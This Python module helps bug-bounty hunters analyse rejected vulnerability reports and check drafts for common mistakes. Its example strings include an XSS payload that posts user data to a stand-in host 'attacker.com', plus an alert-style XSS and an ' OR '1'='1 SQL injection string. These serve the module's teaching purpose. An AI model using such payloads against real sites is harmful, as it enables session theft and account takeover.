"""
Mistake Analyzer Module
Analyzes rejected reports and teaches hunters about common mistakes.
Focuses on improving hunter methodology through failure analysis.
"""

from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum
from datetime import datetime


class MistakeCategory(str, Enum):
    """Categories of common mistakes"""
    DUPLICATE_REPORT = "duplicate_report"
    WEAK_IMPACT = "weak_impact"
    POOR_REPRODUCTION = "poor_reproduction"
    LOW_CONFIDENCE = "low_confidence"
    INSUFFICIENT_EVIDENCE = "insufficient_evidence"
    VAGUE_DESCRIPTION = "vague_description"
    MISSING_BUSINESS_CONTEXT = "missing_business_context"
    INCORRECT_SEVERITY = "incorrect_severity"
    SCOPE_MISUNDERSTANDING = "scope_misunderstanding"
    INSUFFICIENT_VALIDATION = "insufficient_validation"
    WEAK_PROOF_OF_CONCEPT = "weak_proof_of_concept"
    MISSING_ROOT_CAUSE = "missing_root_cause"


@dataclass
class CommonMistake:
    """Definition of a common mistake"""
    category: MistakeCategory
    title: str
    description: str
    why_it_matters: str
    how_to_avoid: List[str]
    example_incorrect: str
    example_correct: str
    impact_on_report: str


@dataclass
class RejectionAnalysis:
    """Analysis of a rejected report"""
    finding_id: str
    original_title: str
    rejection_reason: str
    detected_mistakes: List[MistakeCategory]
    mistake_explanations: List[str]
    improvements_recommended: List[str]
    severity_estimate: str
    resubmission_guidance: str


class MistakeAnalyzer:
    """
    Analyzes rejected reports and identifies common mistakes.
    Provides educational feedback to improve hunter methodology.
    """

    def __init__(self):
        """Initialize mistake definitions"""
        self.mistake_database = self._initialize_mistakes()

    def _initialize_mistakes(self) -> Dict[MistakeCategory, CommonMistake]:
        """Initialize comprehensive mistake database"""
        return {
            MistakeCategory.DUPLICATE_REPORT: CommonMistake(
                category=MistakeCategory.DUPLICATE_REPORT,
                title="Duplicate Report",
                description="Report describes a vulnerability that was already reported by another hunter",
                why_it_matters="Programs reward first finder. Duplicate reports won't receive bounty and reduce your reputation as a hunter",
                how_to_avoid=[
                    "Search the program's hall of fame or vulnerability database before reporting",
                    "Check if similar vulnerabilities have been disclosed recently",
                    "Review changelog or recent program updates for similar issues",
                    "Ask in program's community if unsure about similar reports",
                    "Focus on finding new, unreported classes of vulnerabilities"
                ],
                example_incorrect="Found SQL injection in /search endpoint that can extract user data",
                example_correct="Found SQL injection in /search endpoint affecting X parameter. Verified via program's HoF that no prior report exists for this specific endpoint/parameter combination",
                impact_on_report="Report is rejected entirely. No bounty awarded. Your reputation as a finder is diminished"
            ),
            MistakeCategory.WEAK_IMPACT: CommonMistake(
                category=MistakeCategory.WEAK_IMPACT,
                title="Weak or Unclear Impact",
                description="Report doesn't clearly explain what a hacker could do with the vulnerability",
                why_it_matters="Programs care about real-world impact. Weak impact descriptions indicate you don't fully understand the vulnerability or its implications",
                how_to_avoid=[
                    "Always explain what data/actions are at risk",
                    "Quantify impact (e.g., affects 10000 users, not just 'many users')",
                    "Consider attacker motivations and what they could gain",
                    "Explain both technical and business impact",
                    "Consider cascading impacts - what's the next step for an attacker?"
                ],
                example_incorrect="XSS vulnerability found in comment section",
                example_correct="XSS vulnerability in comment section allows attackers to steal user session cookies, enabling account takeover of any user who views a malicious comment. Affects all 50000+ active users",
                impact_on_report="Report downgraded to lower severity. Bounty reduced. Program may ask for clarification"
            ),
            MistakeCategory.POOR_REPRODUCTION: CommonMistake(
                category=MistakeCategory.POOR_REPRODUCTION,
                title="Poor Reproduction Steps",
                description="Reproduction steps are vague, incomplete, or unclear",
                why_it_matters="Program testers need to reproduce vulnerability to verify it's real. Vague steps waste their time and may result in rejection",
                how_to_avoid=[
                    "Write step-by-step instructions like you're teaching someone",
                    "Include exact URLs, parameters, data values",
                    "Specify request method (GET, POST, etc)",
                    "Note any prerequisites (logged in, specific permissions, etc)",
                    "Test your own steps to ensure they work",
                    "Include screenshots or HTTP request examples"
                ],
                example_incorrect="XSS happens in comment section",
                example_correct="1. Log in as user@test.com\n2. Navigate to /posts/123/comments\n3. Submit comment with content: <img src=x onerror=alert('xss')>\n4. Refresh page\n5. JavaScript alert appears\n6. Browser console shows execution",
                impact_on_report="Program can't verify vulnerability. Report rejected with request to provide better steps"
            ),
            MistakeCategory.LOW_CONFIDENCE: CommonMistake(
                category=MistakeCategory.LOW_CONFIDENCE,
                title="Low Confidence Finding",
                description="Report is about a theoretical or suspected vulnerability without solid proof",
                why_it_matters="Programs need confidence that vulnerability is real. Theoretical issues waste tester time",
                how_to_avoid=[
                    "Only report vulnerabilities you can reproduce consistently",
                    "Avoid 'may be vulnerable' or 'could allow' language",
                    "Provide evidence (screenshots, responses, logs)",
                    "Test multiple times to ensure consistency",
                    "Eliminate alternative explanations"
                ],
                example_incorrect="This endpoint might be vulnerable to SQL injection because it accepts user input",
                example_correct="This endpoint is vulnerable to SQL injection: payload ' OR '1'='1 returns all user records instead of filtered results (HTTP 200, includes other users' data)",
                impact_on_report="Report marked as 'low confidence' or 'needs more validation'. May be rejected if confidence too low"
            ),
            MistakeCategory.INSUFFICIENT_EVIDENCE: CommonMistake(
                category=MistakeCategory.INSUFFICIENT_EVIDENCE,
                title="Insufficient Evidence",
                description="Report lacks screenshots, HTTP requests, code snippets, or other supporting evidence",
                why_it_matters="Evidence is what proves the vulnerability is real. Without it, program can't trust your claim",
                how_to_avoid=[
                    "Include multiple screenshots from different angles",
                    "Capture HTTP requests/responses (use DevTools Network tab)",
                    "Show source code if applicable",
                    "Include error messages or unusual responses",
                    "Document evidence collection date/time",
                    "Redact sensitive data appropriately"
                ],
                example_incorrect="Stored XSS vulnerability found on user profile page",
                example_correct="Stored XSS on profile page:\n[Screenshot 1: Payload submitted]\n[Screenshot 2: Profile page with alert box]\n[HTTP request showing payload]\n[HTTP response showing unencoded payload in HTML]",
                impact_on_report="Program asks for more evidence. Report may be rejected as 'insufficient proof'"
            ),
            MistakeCategory.VAGUE_DESCRIPTION: CommonMistake(
                category=MistakeCategory.VAGUE_DESCRIPTION,
                title="Vague or Generic Description",
                description="Description is too generic and could apply to many vulnerabilities",
                why_it_matters="Vague descriptions indicate shallow understanding. Specific, detailed descriptions show thorough research",
                how_to_avoid=[
                    "Be specific about exact location and method",
                    "Name specific parameters, fields, endpoints",
                    "Describe exact conditions needed to exploit",
                    "Avoid generic statements",
                    "Explain what makes this unique or noteworthy"
                ],
                example_incorrect="Security issue found in application",
                example_correct="Authentication bypass in /api/admin endpoint: POST /api/admin?bypass=true allows unauthenticated requests to admin functions, accessible without JWT token",
                impact_on_report="Program requests clarification. Report may be rejected as 'too vague'"
            ),
            MistakeCategory.MISSING_BUSINESS_CONTEXT: CommonMistake(
                category=MistakeCategory.MISSING_BUSINESS_CONTEXT,
                title="Missing Business Context",
                description="Report focuses on technical details without explaining business impact",
                why_it_matters="Programs care about real business risks. Explaining business context makes your report more valuable",
                how_to_avoid=[
                    "Consider: What could attacker do in real world?",
                    "Quantify user impact (how many users affected?)",
                    "Explain compliance implications (GDPR, HIPAA, etc)",
                    "Consider financial impact to company",
                    "Think about brand/reputation damage",
                    "Include business-level recommendations"
                ],
                example_incorrect="SQL injection in /search endpoint allows data extraction",
                example_correct="SQL injection in /search endpoint allows attackers to extract all user data including emails, phone numbers, payment info. This affects 100000+ users and violates GDPR requiring data minimization. Business impact: potential $X million in GDPR fines plus brand damage",
                impact_on_report="Report scored as lower priority/severity. Bounty may be lower than expected"
            ),
            MistakeCategory.INCORRECT_SEVERITY: CommonMistake(
                category=MistakeCategory.INCORRECT_SEVERITY,
                title="Incorrect Severity Assessment",
                description="Report claims severity that doesn't match actual impact",
                why_it_matters="Incorrect severity wastes program resources. Programs have severity guidelines for bounty decisions",
                how_to_avoid=[
                    "Understand program's severity definitions",
                    "Compare your finding to example vulnerabilities in program docs",
                    "Ask program moderators if unsure about severity",
                    "Consider: exploitability, user impact, data sensitivity",
                    "Be honest about severity - underscore is better than overscore"
                ],
                example_incorrect="CRITICAL: typo in error message reveals server version",
                example_correct="MEDIUM: error message reveals server version (public info but could aid targeted attacks)",
                impact_on_report="Report downgraded to correct severity. Bounty adjusted. Your credibility decreases"
            ),
            MistakeCategory.SCOPE_MISUNDERSTANDING: CommonMistake(
                category=MistakeCategory.SCOPE_MISUNDERSTANDING,
                title="Vulnerability Outside Scope",
                description="Report is about a vulnerability that program explicitly marked as out of scope",
                why_it_matters="Out-of-scope reports won't be rewarded. Programs have scope rules for legal/security reasons",
                how_to_avoid=[
                    "Always read program scope documentation carefully",
                    "Check what's IN scope and what's OUT of scope",
                    "Ask program moderators if uncertain",
                    "Focus on in-scope assets and functionality",
                    "Avoid physical security, social engineering, undisclosed systems"
                ],
                example_incorrect="Found SQL injection on staging.company.com (not listed in scope)",
                example_correct="Found SQL injection on app.company.com (in scope) affecting production user data",
                impact_on_report="Report is rejected. No bounty awarded. Not recorded in your statistics"
            ),
            MistakeCategory.INSUFFICIENT_VALIDATION: CommonMistake(
                category=MistakeCategory.INSUFFICIENT_VALIDATION,
                title="Insufficient Validation",
                description="Report lacks proper validation that vulnerability is real and exploitable",
                why_it_matters="Thorough validation separates serious hunters from casual ones. Programs appreciate validated findings",
                how_to_avoid=[
                    "Test vulnerability multiple times",
                    "Test with different inputs/payloads",
                    "Test with different accounts/permissions",
                    "Verify exploit works consistently",
                    "Eliminate false positives",
                    "Document validation process"
                ],
                example_incorrect="SSRF found in URL parameter - server accepts URLs",
                example_correct="SSRF confirmed: server makes HTTP requests to attacker-specified URLs, verified via server logs showing connection from target server to attacker test domain. Tested with HTTP and HTTPS. Consistently reproducible",
                impact_on_report="Program questions validity. May ask for more validation before payment"
            ),
            MistakeCategory.WEAK_PROOF_OF_CONCEPT: CommonMistake(
                category=MistakeCategory.WEAK_PROOF_OF_CONCEPT,
                title="Weak Proof of Concept",
                description="PoC doesn't effectively demonstrate the vulnerability or impact",
                why_it_matters="Strong PoC is final proof that vulnerability is real and exploitable",
                how_to_avoid=[
                    "Use meaningful PoC payloads (not just test alerts)",
                    "Demonstrate real-world impact (data access, account takeover, etc)",
                    "Make PoC easy to verify for program testers",
                    "Document PoC clearly",
                    "Test PoC multiple times before submitting"
                ],
                example_incorrect="XSS PoC: <img src=x onerror=alert('xss')>",
                example_correct="XSS PoC: <img src=x onerror=\"fetch('/api/user',{headers:{'Authorization':'Bearer '+document.cookie}}).then(r=>r.json()).then(d=>new Image().src='http://attacker.com/collect?data='+btoa(JSON.stringify(d)))\">, demonstrating session cookie theft",
                impact_on_report="Program may not fully appreciate severity. PoC should be more realistic"
            ),
            MistakeCategory.MISSING_ROOT_CAUSE: CommonMistake(
                category=MistakeCategory.MISSING_ROOT_CAUSE,
                title="Missing Root Cause Analysis",
                description="Report doesn't explain WHY the vulnerability exists",
                why_it_matters="Root cause analysis helps program developers fix the issue properly, not just the symptom",
                how_to_avoid=[
                    "Identify the specific code or configuration issue",
                    "Explain the flaw in security logic",
                    "Include source code if possible",
                    "Suggest proper fix (whitelist vs blacklist, etc)",
                    "Help program understand the mistake"
                ],
                example_incorrect="SQL injection in search endpoint",
                example_correct="SQL injection because /search endpoint concatenates user input directly into SQL query without parameterized queries. Fix: use prepared statements with parameter binding",
                impact_on_report="Report is good but could be exceptional. Developers appreciate root cause analysis"
            )
        }

    def analyze_rejection_reason(
        self,
        rejection_reason: str,
        finding_details: Dict
    ) -> RejectionAnalysis:
        """
        Analyze a rejection reason and identify probable mistakes.
        
        Args:
            rejection_reason: Reason provided by program for rejection
            finding_details: Details of the rejected finding
            
        Returns:
            RejectionAnalysis with identified mistakes and recommendations
        """
        detected_mistakes = self._detect_mistakes_from_reason(
            rejection_reason,
            finding_details
        )
        
        mistake_explanations = [
            self.mistake_database[mistake].why_it_matters
            for mistake in detected_mistakes
            if mistake in self.mistake_database
        ]
        
        improvements = self._generate_improvements(
            detected_mistakes,
            finding_details
        )
        
        analysis = RejectionAnalysis(
            finding_id=finding_details.get("finding_id", "unknown"),
            original_title=finding_details.get("title", ""),
            rejection_reason=rejection_reason,
            detected_mistakes=detected_mistakes,
            mistake_explanations=mistake_explanations,
            improvements_recommended=improvements,
            severity_estimate=self._estimate_true_severity(finding_details),
            resubmission_guidance=self._generate_resubmission_guidance(detected_mistakes)
        )
        
        return analysis

    def _detect_mistakes_from_reason(
        self,
        rejection_reason: str,
        finding_details: Dict
    ) -> List[MistakeCategory]:
        """Detect probable mistakes based on rejection reason"""
        reason_lower = rejection_reason.lower()
        detected = []
        
        # Keyword-based detection
        if any(keyword in reason_lower for keyword in ["duplicate", "already reported", "prior report"]):
            detected.append(MistakeCategory.DUPLICATE_REPORT)
        
        if any(keyword in reason_lower for keyword in ["impact", "unclear impact", "what can"]):
            detected.append(MistakeCategory.WEAK_IMPACT)
        
        if any(keyword in reason_lower for keyword in ["reproduce", "steps unclear", "can't verify"]):
            detected.append(MistakeCategory.POOR_REPRODUCTION)
        
        if any(keyword in reason_lower for keyword in ["confidence", "likely", "seems", "might"]):
            detected.append(MistakeCategory.LOW_CONFIDENCE)
        
        if any(keyword in reason_lower for keyword in ["evidence", "proof", "screenshot", "log"]):
            detected.append(MistakeCategory.INSUFFICIENT_EVIDENCE)
        
        if any(keyword in reason_lower for keyword in ["vague", "generic", "unclear", "describe better"]):
            detected.append(MistakeCategory.VAGUE_DESCRIPTION)
        
        if any(keyword in reason_lower for keyword in ["severity", "critical", "high", "low"]):
            detected.append(MistakeCategory.INCORRECT_SEVERITY)
        
        if any(keyword in reason_lower for keyword in ["out of scope", "not eligible", "policy"]):
            detected.append(MistakeCategory.SCOPE_MISUNDERSTANDING)
        
        if any(keyword in reason_lower for keyword in ["validate", "verify", "confirm", "test"]):
            detected.append(MistakeCategory.INSUFFICIENT_VALIDATION)
        
        if any(keyword in reason_lower for keyword in ["business", "context", "real world"]):
            detected.append(MistakeCategory.MISSING_BUSINESS_CONTEXT)
        
        return detected if detected else [MistakeCategory.INSUFFICIENT_EVIDENCE]

    def _generate_improvements(
        self,
        mistakes: List[MistakeCategory],
        finding_details: Dict
    ) -> List[str]:
        """Generate improvement recommendations"""
        improvements = []
        
        for mistake in mistakes:
            if mistake in self.mistake_database:
                mistake_def = self.mistake_database[mistake]
                improvements.extend(mistake_def.how_to_avoid[:2])  # Top 2 improvements
        
        return improvements

    def _estimate_true_severity(self, finding_details: Dict) -> str:
        """Estimate what the true severity might be"""
        claimed_severity = finding_details.get("severity", "unknown").lower()
        
        # Based on claimed severity and other factors
        if "session" in str(finding_details).lower() or "authenticate" in str(finding_details).lower():
            return "High to Critical"
        elif "data" in str(finding_details).lower() or "user" in str(finding_details).lower():
            return "Medium to High"
        else:
            return "Medium"

    def _generate_resubmission_guidance(self, mistakes: List[MistakeCategory]) -> str:
        """Generate guidance for resubmitting improved report"""
        if not mistakes:
            return "Report appears sound. Investigate why it was rejected."
        
        primary_mistake = mistakes[0]
        if primary_mistake in self.mistake_database:
            mistake_def = self.mistake_database[primary_mistake]
            return f"Focus on addressing: {mistake_def.title}. {mistake_def.description}. " \
                   f"Key improvement: Use the 'correct' example format provided in analysis."
        
        return "Resubmit with more detail, evidence, and clear business impact explanation."

    def recommend_improvements(
        self,
        finding_details: Dict
    ) -> Dict:
        """
        Provide improvement recommendations for a finding before rejection.
        Proactive mistake prevention.
        
        Args:
            finding_details: Dictionary with finding details
            
        Returns:
            Dictionary with improvement recommendations
        """
        issues_found = []
        
        # Check for common issues
        title = finding_details.get("title", "")
        description = finding_details.get("description", "")
        reproduction_steps = finding_details.get("reproduction_steps", "")
        severity = finding_details.get("severity", "")
        
        # Title check
        if len(title) < 10:
            issues_found.append({
                "category": "Title too short",
                "current": title,
                "recommendation": "Use a more descriptive title (30-50 characters is good)",
                "example": "SQL Injection in /search endpoint allows database read access"
            })
        
        # Description check
        if len(description) < 50:
            issues_found.append({
                "category": "Description too brief",
                "recommendation": "Expand description to include what data/actions are at risk",
                "example": "Include affected parameter, potential data exposure, user impact"
            })
        
        # Reproduction steps check
        if not reproduction_steps or len(reproduction_steps) < 30:
            issues_found.append({
                "category": "Missing reproduction steps",
                "recommendation": "Provide step-by-step reproduction with exact parameters",
                "example": "1. Navigate to [URL]\n2. Submit [payload]\n3. [Result]"
            })
        
        # Evidence check
        evidence_count = finding_details.get("evidence_count", 0)
        if evidence_count < 2:
            issues_found.append({
                "category": "Insufficient evidence",
                "recommendation": "Include 3+ pieces of evidence (screenshots, HTTP requests, responses)",
                "example": "Screenshot of vulnerability + HTTP request + HTTP response"
            })
        
        return {
            "finding_id": finding_details.get("finding_id", "unknown"),
            "issues_found": len(issues_found),
            "improvements": issues_found,
            "overall_assessment": "Ready to submit" if not issues_found else "Needs improvement",
            "estimated_probability_of_acceptance": f"{(100 - (len(issues_found) * 15)):.0f}%"
        }

    def detect_common_mistakes(
        self,
        report_text: str,
        report_metadata: Dict
    ) -> Dict:
        """
        Scan a report for common mistakes before submission.
        
        Args:
            report_text: Full report text
            report_metadata: Metadata (title, severity, etc)
            
        Returns:
            Dictionary with detected mistakes and fixes
        """
        mistakes_found = []
        
        # Check for vague language
        vague_words = ["might", "may", "could", "possibly", "seems", "appears", "likely"]
        if any(word in report_text.lower() for word in vague_words):
            mistakes_found.append({
                "type": "Low confidence language",
                "description": "Report uses uncertain language",
                "fix": "Replace 'might allow' with 'allows', 'could leak' with 'leaks'",
                "severity": "medium"
            })
        
        # Check for generic descriptions
        generic_phrases = ["security issue", "vulnerability found", "bug exists"]
        if any(phrase in report_text.lower() for phrase in generic_phrases):
            mistakes_found.append({
                "type": "Generic description",
                "description": "Report uses generic language",
                "fix": "Be specific: which endpoint, which parameter, which data",
                "severity": "high"
            })
        
        # Check for missing business impact
        if "user" not in report_text.lower() and "data" not in report_text.lower():
            mistakes_found.append({
                "type": "Missing business context",
                "description": "No mention of user impact or data at risk",
                "fix": "Explain what data/users are affected and why it matters",
                "severity": "medium"
            })
        
        return {
            "report_id": report_metadata.get("report_id", "unknown"),
            "mistakes_detected": len(mistakes_found),
            "mistakes": mistakes_found,
            "quality_score": max(0, 100 - (len(mistakes_found) * 20)),
            "ready_for_submission": len(mistakes_found) == 0
        }
